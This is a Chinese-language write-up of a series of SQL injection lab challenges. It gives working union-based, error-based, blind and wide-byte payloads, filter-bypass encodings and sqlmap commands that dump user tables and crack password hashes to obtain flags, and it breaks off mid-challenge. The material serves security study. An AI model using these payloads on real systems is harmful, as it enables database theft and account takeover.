# <font style="color:rgb(51, 51, 51);">SQL注入漏洞测试(布尔盲注)</font>
进入环境后，尝试账号密码无果后，点击通知部分，发现可以进入新的页面：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757343609548-60b458ad-0303-4914-b9ab-105213c2343d.png)

发现该页面的URL疑似注入点：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757343641760-410694b2-2555-485b-a029-18399644180b.png)

通过布尔盲注发现确实存在数字型注入：

```plain
http://124.70.71.251:41058/new_list.php?id=1 and 1=1
http://124.70.71.251:41058/new_list.php?id=1 and 1=2
```

使用sqlmap一把梭：

```plain
python sqlmap.py -u "http://124.70.71.251:41058/new_list.php?id=1"
```

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757343826331-0c5303e2-d2e9-454f-ac87-ae735c9ba1bb.png)

注出当前数据库：

```plain
python sqlmap.py -u "http://124.70.71.251:41058/new_list.php?id=1" --current-db
```

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757343871161-666c3438-c7b2-41ca-8d62-9cd7e2d25eb3.png)

注出当前数据库的表：

```plain
python sqlmap.py -u "http://124.70.71.251:41058/new_list.php?id=1" -D "stormgroup" --tables
```

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757343918184-b286c8ab-4435-49cb-8d9a-e33a1b89d320.png)

注出该表的字段：

```plain
python sqlmap.py -u "http://124.70.71.251:41058/new_list.php?id=1" -D "stormgroup" -T "member" --columns
```

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757343955448-afb202a2-f7e7-4a15-8bf2-f7b586687e16.png)

注出每个字段的内容：

```plain
python sqlmap.py -u "http://124.70.71.251:41058/new_list.php?id=1" -D "stormgroup" -T "member" -C "name,status,password" --dump
```

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757344010721-367962c0-8a26-40cf-8d63-9ce0639c7add.png)

选取`status=1`的密码进行MD5解密：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757344042314-3080f13b-9063-4cc9-8244-753deab9d513.png)

将得到的账号密码输入：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757343702238-2d24f445-65b1-4191-b179-dc345e613458.png)

进入后台，得到KEY：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757343721486-99608c5e-4f8f-4f85-89a5-ef4d52e6a2f7.png)

# SQL手工注入漏洞测试(MySQL数据库-字符型)
进入环境后，页面与上一题一样，直接进入通知页面：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757381421277-d17f7723-e918-44b8-8469-fccb3302d9c9.png)

开始用单双引号测试闭合方式：

```plain
http://124.70.64.48:46754/new_list.php?id=tingjigonggao' or '1'='1
http://124.70.64.48:46754/new_list.php?id=tingjigonggao" or "1"="1
```

发现单引号<font style="color:rgb(77, 77, 77);">能正确返回页面，双引号不行。</font>

<font style="color:rgb(77, 77, 77);">开始用</font>`<font style="color:rgb(77, 77, 77);">order by</font>`<font style="color:rgb(77, 77, 77);">测试列数：</font>

```plain
http://124.70.64.48:46754/new_list.php?id=tingjigonggao' order by 5--+
```

发现有4列。

开始用`union`注入，回显数据库数据：

```plain
http://124.70.64.48:46754/new_list.php?id=tingjigonggao' union select 1,2,3,4--+
```

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757382117138-c6f21f97-de60-45cd-b178-ce3ccb08d802.png)

页面正常执行，但没有返回`union select`的结果，这是因为代码只返回第一条结果，所以`union select`获取的结果没有输出到页面。可以通过设置参数`id`的值，让服务端返回`union select`的结果。例如，把`id`的值设置为`tingji`，这样数据库没有`id=tingji`的数据，就会返回`union select`的结果：

```plain
http://124.70.64.48:46754/new_list.php?id=tingji' union select 1,2,3,4--+
```

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757382169452-bb6f38fb-96d3-44b7-ac20-3518f2b1a6fe.png)

可以看到，页面只回显2、3列的数据，所以可以在这两列读取数据库信息：

```plain
http://124.70.64.48:46754/new_list.php?id=tingji' union select 1,database(),user(),4--+
```

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757382265322-f87ad678-da87-4fb1-a4bb-49a20ea741d0.png)

查询表名：

```plain
http://124.70.64.48:46754/new_list.php?id=tingji' union select 1,(select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA='mozhe_discuz_stormgroup'),3,4--+
```

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757382553932-c39181cf-7cee-4621-b649-90b323235bab.png)

查询字段名：

```plain
http://124.70.64.48:46754/new_list.php?id=tingji' union select 1,(select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_SCHEMA='mozhe_discuz_stormgroup' and TABLE_NAME='stormgroup_member'),3,4--+
```

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757382670373-ff1c5490-b035-4f30-827b-2dc888a2f5b8.png)

查询具体内容：

```plain
http://124.70.64.48:46754/new_list.php?id=tingji' union select 1,(select group_concat(id,name,password,status) from mozhe_discuz_stormgroup.stormgroup_member),3,4--+
```

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757382782867-39583cae-d72a-4f39-9d5a-87a9bda350cc.png)

有点太长了，尝试分隔开：

```plain
http://124.70.64.48:46754/new_list.php?id=tingji' union select 1,group_concat(id,0x5c,name),group_concat(password,0x5c,status),4 from mozhe_discuz_stormgroup.stormgroup_member--+
```

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757383021853-a7748abe-86b4-4dcc-aacb-24b1a400294a.png)

选择`status=1`的密码进行md5解密：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757383096567-194a0860-16f2-4bf6-afcd-d75f8f74317a.png)

输入账号密码：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757383134153-3933efec-06ed-44d2-a0c9-3c3e980bb93a.png)

成功进入后台，取得KEY：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757383150225-3c764571-1592-4d5f-8e01-ef1880a4ec41.png)

> 关于数字型SQL注入和字符型SQL注入的区别，最显著的应该是数字型不需要引号来闭合。
>
> 数字型SQL的注入点类似于`?id=1`，其背后的SQL语句类似于`select * from users where id = 1`。在测试时满足以下三点，则说明存在数字型SQL注入：
>
> + `?id=1'`页面报错或者空白
> + `?id=1 and 1=1`页面与`?id=1`显示一致
> + `?id=1 and 1=2`页面报错或者空白
>
> 字符型SQL的注入点类似于`?id=tingjitongzhi`，其背后的SQL语句类似于`select * from users where id = 'tingjitongzhi'`。在测试时满足以下三点，则说明存在字符型SQL注入（在这之前可能还要单双引号测试闭合方式）：
>
> + `?id=tingjitongzhi'`页面报错
> + `?id=tingjitongzhi' and '1'='1`页面正常返回
> + `?id=tingjitongzhi' and '1'='2`页面报错
>

# <font style="color:rgb(51, 51, 51);">SQL手工注入漏洞测试(MySQL数据库)</font>
这题环境与前面两题一致，思路上与第二题几乎一致，只是字符型与数字型的区别，思路如下：

1. 通过构造恒真恒假条件发现存在数字型注入漏洞
2. 用`order by`<font style="color:rgb(77, 77, 77);">测试列数，发现有4列</font>
3. <font style="color:rgb(77, 77, 77);">通过</font>`<font style="color:rgb(77, 77, 77);">?id=-1 union select 1,2,3,4</font>`<font style="color:rgb(77, 77, 77);">发现回显2、3列</font>
4. <font style="color:rgb(77, 77, 77);">通过</font>`<font style="color:rgb(77, 77, 77);">?id=-1 union select 1,database(),user(),4</font>`<font style="color:rgb(77, 77, 77);">查到当前数据库为</font>`<font style="color:rgb(77, 77, 77);">mozhe_Discuz_StormGroup</font>`<font style="color:rgb(77, 77, 77);">，用户为</font>`<font style="color:rgb(77, 77, 77);">root@localhost</font>`
5. <font style="color:rgb(77, 77, 77);">通过</font>`<font style="color:rgb(77, 77, 77);">?id=-1 union select 1,(select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA='mozhe_Discuz_StormGroup'),3,4</font>`<font style="color:rgb(77, 77, 77);">查到有</font>`<font style="color:rgb(77, 77, 77);">StormGroup_member</font>`<font style="color:rgb(77, 77, 77);">和</font>`<font style="color:rgb(77, 77, 77);">notice</font>`<font style="color:rgb(77, 77, 77);">两张表</font>
6. <font style="color:rgb(77, 77, 77);">通过</font>`<font style="color:rgb(77, 77, 77);">?id=-1 union select 1,(select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_SCHEMA='mozhe_Discuz_StormGroup' and TABLE_NAME='StormGroup_member'),3,4</font>`<font style="color:rgb(77, 77, 77);">查到有</font>`<font style="color:rgb(77, 77, 77);">id</font>`<font style="color:rgb(77, 77, 77);">、</font>`<font style="color:rgb(77, 77, 77);">name</font>`<font style="color:rgb(77, 77, 77);">、</font>`<font style="color:rgb(77, 77, 77);">password</font>`<font style="color:rgb(77, 77, 77);">、</font>`<font style="color:rgb(77, 77, 77);">status</font>`<font style="color:rgb(77, 77, 77);">四个字段</font>
7. <font style="color:rgb(77, 77, 77);">通过</font>`<font style="color:rgb(77, 77, 77);">?id=-1 union select 1,group_concat(id,0x5c,name),group_concat(password,0x5c,status),4 from mozhe_Discuz_StormGroup.StormGroup_member</font>`<font style="color:rgb(77, 77, 77);">查到</font>`<font style="color:rgb(77, 77, 77);">status=1</font>`<font style="color:rgb(77, 77, 77);">的</font>`<font style="color:rgb(77, 77, 77);">id=1</font>`<font style="color:rgb(77, 77, 77);">、</font>`<font style="color:rgb(77, 77, 77);">name=mozhe</font>`<font style="color:rgb(77, 77, 77);">，</font>`<font style="color:rgb(77, 77, 77);">password=d044efcb32c7a426d73cd3356154a043</font>`
8. <font style="color:rgb(77, 77, 77);">将密码进行md5解密，并用该账号密码登录即可获得KEY</font>

> <font style="color:rgb(77, 77, 77);">在</font>`<font style="color:rgb(77, 77, 77);">?id=-1 union select 1,2,3,4</font>`<font style="color:rgb(77, 77, 77);">这种正确的列数下却没有任何回显，只是显示正常页面，说明要用布尔盲注，可以用sqlmap等工具进行爆破</font>
>

# <font style="color:rgb(51, 51, 51);">SQL注入实战-MySQL</font>
进入环境，引人注目的是URL中参数值被base64加密了：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757387368623-ca8a92c1-f395-4e5e-bf1f-819f08870c3b.png)

`MQ==`解密后是1，构造恒真恒假条件测试后（经base64加密）发现存在数字型注入漏洞。

用`order by`测试列数，发现有两列。通过`<font style="color:rgb(77, 77, 77);">?id=-1 union select 1,2</font>`<font style="color:rgb(77, 77, 77);">（加密后是</font>`<font style="color:rgb(77, 77, 77);">?id=LTEgdW5pb24gc2VsZWN0IDEsMg==</font>`<font style="color:rgb(77, 77, 77);">），发现1、2列都被回显：</font>

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757387909633-fe71bc69-e3a6-4525-8bbe-fde9de387447.png)

由于手动加解密还是太麻烦了，这里选择用sqlmap一把梭，顺便熟悉下<font style="color:rgb(51, 51, 51);">tamper插件的使用。</font>

```plain
python sqlmap.py -u "http://124.70.71.251:48756/show.php?id=MQ==" --tamper base64encode.py --current-db --level 3 --risk 3
```

> 这里的`--tamper base64encode.py`意思是使用了base64编码的插件，`--level 3 --risk 3`的`--level`和`--risk`参数控制了`sqlmap`测试的深度和风险级别。增加这些值可以使`sqlmap`执行更激进的测试，帮助发现更多潜在的注入点。
>
> + `--level`（默认值为1）决定了测试的复杂度。增大此值（如2或3）可以使sqlmap尝试更多的攻击向量。
> + `--risk`（默认值为1）控制测试的风险级别。增大此值（如2或3）可以使sqlmap尝试更具破坏性的测试，如盲注或其他高级注入方式。
>

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757388791023-96dbe049-0d8b-4b4a-bb43-686c2fe00477.png)<font style="color:rgb(51, 51, 51);">  
</font><font style="color:rgb(51, 51, 51);">可以看到当前数据库是</font>`<font style="color:rgb(51, 51, 51);">test</font>`<font style="color:rgb(51, 51, 51);">。继续查询对应的表：</font>

```plain
python sqlmap.py -u "http://124.70.71.251:48756/show.php?id=MQ==" --tamper base64encode.py -D "test" --tables
```

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757389200282-5b34e66c-fcdd-4c58-8541-e3bf4c6551a9.png)

继续查询对应的字段：

```plain
python sqlmap.py -u "http://124.70.71.251:48756/show.php?id=MQ==" --tamper base64encode.py -D "test" -T "data" --columns
```

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757389328445-1fa20c0d-7a36-4c19-b77c-e0171ef2f532.png)

继续查询字段具体的内容：

```plain
python sqlmap.py -u "http://124.70.71.251:48756/show.php?id=MQ==" --tamper base64encode.py -D "test" -T "data" -C "id,main,thekey,title" --dump
```

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757389496405-32352f3f-02cc-4445-9a29-3be0cd3458b5.png)

可以看到KEY已经得到了。

# <font style="color:rgb(51, 51, 51);">SQL注入漏洞测试(报错盲注)</font>
这题环境与前三题一致，进入通知页面后观察URL，加单引号进行测试：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757390320632-a038b924-376a-4472-b9bc-17da9bc46f81.png)

可以看到错误信息被直接输出到了页面上，存在报错注入。

查询当前数据库：

```plain
id=1' AND updatexml(1,concat(0x7e,(select database()),0x7e),1)--+
```

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757390404208-5de17d20-b8d4-4812-8d47-15c859864252.png)

可见当前数据库是`<font style="color:rgb(0, 0, 0);">stormgroup</font>`<font style="color:rgb(0, 0, 0);">。接着查询该库对应的表：</font>

```plain
id=1' AND updatexml(1,concat(0x7e,(select group_concat(TABLE_NAME) from information_schema.TABLES WHERE TABLE_SCHEMA='stormgroup'),0x7e),1)--+
```

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757390677679-62b52125-83aa-42d0-96fe-b128807b53dd.png)

继续查询`member`表对应的字段：

```plain
id=1' AND updatexml(1,concat(0x7e,(select group_concat(COLUMN_NAME) from information_schema.COLUMNS WHERE TABLE_SCHEMA='stormgroup' AND TABLE_NAME='member'),0x7e),1)--+
```

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757390877682-dd3a266d-9882-48a1-a8c4-6531f789d9e7.png)

继续查询字段具体的内容：

```plain
id=1' AND updatexml(1,concat(0x7e,(select group_concat(name,password,status) from stormgroup.member),0x7e),1)--+
```

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757398945463-03abf47f-67a8-42e4-a828-378f9ed33a5e.png)

可以看到其实显示不全，这是因为`updatexml()`最多只能输出32字节，可以用`mid`之类的函数分段回显拿到完整数据：

```plain
id=1' AND updatexml(1,concat(0x7e,mid((select group_concat(name,password,status) from stormgroup.member),1,30),0x7e),1)--+
```

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757399082972-7030b160-a431-4170-a6cd-aec2a3ffed30.png)

```plain
id=1' AND updatexml(1,concat(0x7e,mid((select group_concat(name,password,status) from stormgroup.member),31,30),0x7e),1)--+
```

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757399139990-78f93a6f-0148-4e20-9293-55392c36e04e.png)

```plain
id=1' AND updatexml(1,concat(0x7e,mid((select group_concat(name,password,status) from stormgroup.member),61,30),0x7e),1)--+
```

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757399219813-edbe060b-506e-4c1b-8c9b-3ce6f0f61be9.png)

<font style="color:rgb(0, 0, 0);">将</font>`<font style="color:rgb(0, 0, 0);">status=1</font>`<font style="color:rgb(0, 0, 0);">的密码拼起来，再md5解密，输入账号密码即可拿到KEY。</font>

> <font style="color:rgb(0, 0, 0);">这里的</font>`<font style="color:rgb(0, 0, 0);">mid()</font>`<font style="color:rgb(0, 0, 0);">函数参数是经过考虑的， 之所以用的是</font>`<font style="color:rgb(0, 0, 0);">mid(..., 1, 30)</font>`<font style="color:rgb(0, 0, 0);">、</font>`<font style="color:rgb(0, 0, 0);">mid(..., 31, 30)</font>`<font style="color:rgb(0, 0, 0);">、</font>`<font style="color:rgb(0, 0, 0);">mid(..., 61, 30)</font>`<font style="color:rgb(0, 0, 0);">，是因为两个</font>`<font style="color:rgb(0, 0, 0);">~</font>`<font style="color:rgb(0, 0, 0);">就各占了一个字节，所以能用来显示需要的内容的只有30个字节。</font>
>

# <font style="color:rgb(51, 51, 51);">SQL注入漏洞测试(时间盲注)</font>
进入环境后可以进入提示页面：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757399808319-00cc0b0b-fa58-4cba-acbd-d970da80c6d7.png)

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757399829196-53d77657-a7c6-4c22-bd63-729b661d6e5a.png)

可以发现参数是`type`，构造URL如下：

```plain
http://124.70.71.251:43873/flag.php?type=1
```

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757400176182-d3abe340-b0c6-42d9-87ea-69ebc6f1e3e2.png)

加上单引号进行测试：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757400217622-6a89b5cb-f337-4cc5-bdcb-30d097c1f529.png)

直接上`sleep()`方法：

```plain
http://124.70.71.251:43873/flag.php?type=1 and sleep(3)--+
```

发现确实有延迟，可以用时间注入。

构造类似于如下的payload，逐渐爆破出数据库信息：

```plain
http://124.70.71.251:43873/flag.php?type=1 and if(LENGTH(database())=4,sleep(3),1)--+
```

由于时间成本较高，这里交给sqlmap：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757402498187-739a8334-c3ea-430c-b8a1-a83599e8cb6d.png)

将得到的数据输入验证框，即可得到最终的KEY。

> 在测试的过程中，观察到`?type=1' and sleep(3)--+`是不执行后面的`sleep()`方法的，但是`?type=1 and sleep(3)--+`执行了，这也说明该注入属于数字型。
>

# <font style="color:rgb(51, 51, 51);">SQL注入漏洞测试(宽字节)</font>
该题环境依旧是类似文首的几题，进入通知界面：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757403047897-a117565e-fa78-4d30-bf1e-547c2abd9308.png)

加上单引号、构造恒真恒假条件等等，页面均没有变化，怀疑常用的注入字符被后端转义了。考虑构造输入绕过转义，把单引号重新释放出来：

```plain
http://124.70.71.251:45378/new_list.php?id=1%df' and 1=2--+
```

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757403745429-0a80af8b-0de0-4f62-8df5-d34d9b288784.png)

页面没有正常返回，确实存在宽字节注入。用`order by`探测字段个数：

```plain
http://124.70.71.251:45378/new_list.php?id=1%df' order by 5--+
```

发现有5个字段。使用`union select`探测回显哪些列：

```plain
http://124.70.71.251:45378/new_list.php?id=1%df' and 1=2 union select 1,2,3,4,5--+
```

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757403975380-aff6dc3f-fbbf-4184-bfbb-c79ceba640d8.png)

可以看到，第3、5列被回显。开始查询数据库：

```plain
http://124.70.71.251:45378/new_list.php?id=1%df' and 1=2 union select 1,2,database(),4,user()--+
```

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757404175370-c0c20301-6b06-438c-a736-398d792bd721.png)

查询当前数据库的表：

```plain
http://124.70.71.251:45378/new_list.php?id=1%df' and 1=2 union select 1,2,(select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),4,5--+
```

> 这里用了`where TABLE_SCHEMA=database()`还是因为最开始提到的常见注入字符被转义的问题。当然也可以直接把数据库库名转为十六进制<font style="color:rgb(77, 77, 77);">。</font>
>

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757404483905-af3f583d-828c-47da-87b2-41520385fbc0.png)

查询对应的字段：

```plain
http://124.70.71.251:45378/new_list.php?id=1%df' and 1=2 union select 1,2,(select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_SCHEMA=0x6d6f7a68655f64697363757a5f73746f726d67726f7570 and TABLE_NAME=0x73746f726d67726f75705f6d656d626572),4,5--+
```

> 这里转换成十六进制时，直接转换库名、表名即可，不用带上引号。
>

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757405057677-a3bcfa6a-81ae-4eeb-8124-03702fb1d5ee.png)

查询字段对应的具体内容：

```plain
http://124.70.71.251:45378/new_list.php?id=1%df' and 1=2 union select 1,2,(select group_concat(name,password,status) from mozhe_discuz_stormgroup.stormgroup_member),4,5--+
```

> 这里用十六进制会报错，不知道是不是因为MariaDB语法不允许还是太长了。
>

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757406773664-6fab7059-6aa1-4533-b1da-be87824093c7.png)

选取`status=1`的密码进行md5解密，就可以成功登录拿到KEY。

# <font style="color:rgb(51, 51, 51);">SQL过滤字符后手工注入漏洞测试(第1题)</font>
本题仍然是经典环境，进入通知页面后加单引号测试，页面空白，说明存在注入：

```plain
http://124.70.71.251:45677/new_list.php?id=1%27
```

构造`?id=1 and 1=1`和`?id=1 and 1=2`的payload，发现页面会重新跳转到`?id=1`，怀疑`and`这些词被过滤，考虑绕过。大小写绕过不好使，尝试URL编码绕过也不好使，尝试对空格用`/**/`进行替换，等号用`like`进行替换，再进行URL编码（不知道咋想到的...）：

```plain
http://124.70.71.251:45677/new_list.php?id=%31%2f%2a%2a%2f%61%6e%64%2f%2a%2a%2f%31%2f%2a%2a%2f%6c%69%6b%65%2f%2a%2a%2f%31
```

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757408557836-9aa76d69-77db-49cc-99b1-133113a47075.png)成功绕过。接下来的思路都是一样的，`order by`探测字段列数，`union select`确定回显列，获取数据库库名、表名、字段名、字段内容：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757408974678-34039f64-6ee3-475a-a811-04a83975bb7d.png)

选取`status=1`的账号admin及其对应的密码（需md5解密）进行登录，即可获得KEY。

# <font style="color:rgb(51, 51, 51);">SQL过滤字符后手工注入漏洞测试(第2题)</font>
本题仍然是经典环境，进入通知页面后加单引号测试，页面无法显示，说明存在注入：

```plain
http://124.70.71.251:45677/new_list.php?id=1%27
```

构造`?id=1 and 1=1`和`?id=1 and 1=2`的payload，会进入error页面：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757409252347-382a3e91-350c-4580-adbc-de6bdcf392ba.png)

猜测是`and`或者空格被过滤，考虑绕过。尝试对空格用`/**/`进行替换：

```plain
http://124.70.71.251:45677/new_list.php?id=%31%2f%2a%2a%2f%61%6e%64%2f%2a%2a%2f%31%3d%31
```

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757409523298-9cc3dda2-3489-4f97-aa92-b38de996310a.png)

接下来思路和上一题是一样的。

# <font style="color:rgb(51, 51, 51);">SQL过滤字符后手工注入漏洞测试(第3题)</font>
进入环境是一片空白：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757410245936-5db826c1-c9f3-46a4-a919-fca86c13afd6.png)

扫一遍后台，发现是之前出现过的页面：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757410285209-5647e15e-f96c-45a3-8327-b0ee1653aaeb.png)

进入页面发现什么都没有：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757410365072-218b9af8-5a91-4bb9-83d1-4a38dcc96d5c.png)

根据经验构造payload为`?id=1`：

